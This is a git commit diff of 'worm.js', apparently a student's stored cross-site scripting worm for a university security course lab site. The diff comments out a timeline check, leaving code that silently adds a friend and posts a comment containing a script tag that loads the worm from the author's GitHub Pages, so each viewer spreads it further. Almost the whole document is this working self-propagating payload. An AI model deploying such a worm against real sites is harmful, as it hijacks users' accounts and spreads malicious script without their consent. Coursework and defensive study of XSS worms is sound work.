f45dfcca61b0cc84c94a823e02aa4188e182259f
Josh Brown <45466778+J05hBr0wn@users.noreply.github.com>
2021-04-12 23:41:54 -0400

    Update worm.js

--- worm/worm.js
+++ worm/worm.js
@@ -2,11 +2,11 @@ var dt = new Date();
 var time = dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds();
 var dump;
           
-$.get('http://csec380-core.csec.rit.edu:86/timeline.php', function( response ) { 
-    dump = response;
-});
+//$.get('http://csec380-core.csec.rit.edu:86/timeline.php', function( response ) { 
+    //dump = response;
+//});
 
-if (dump.includes(!("J05hbrown.github.io/worm/worm.js"))) {
+//if (dump.includes(!("J05hbrown.github.io/worm/worm.js"))) {
 
 $.get("http://csec380-core.csec.rit.edu:86/addfriend.php", { id: '177' } );
 
@@ -14,4 +14,4 @@ $.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment:'Oh no! 
 
 $.get( "http://csec380-core.csec.rit.edu:86/add_comment.php", { comment:"<script src=https://J05hBr0wn.github.io/worm/worm.js></script>" });
 
-}
+//}
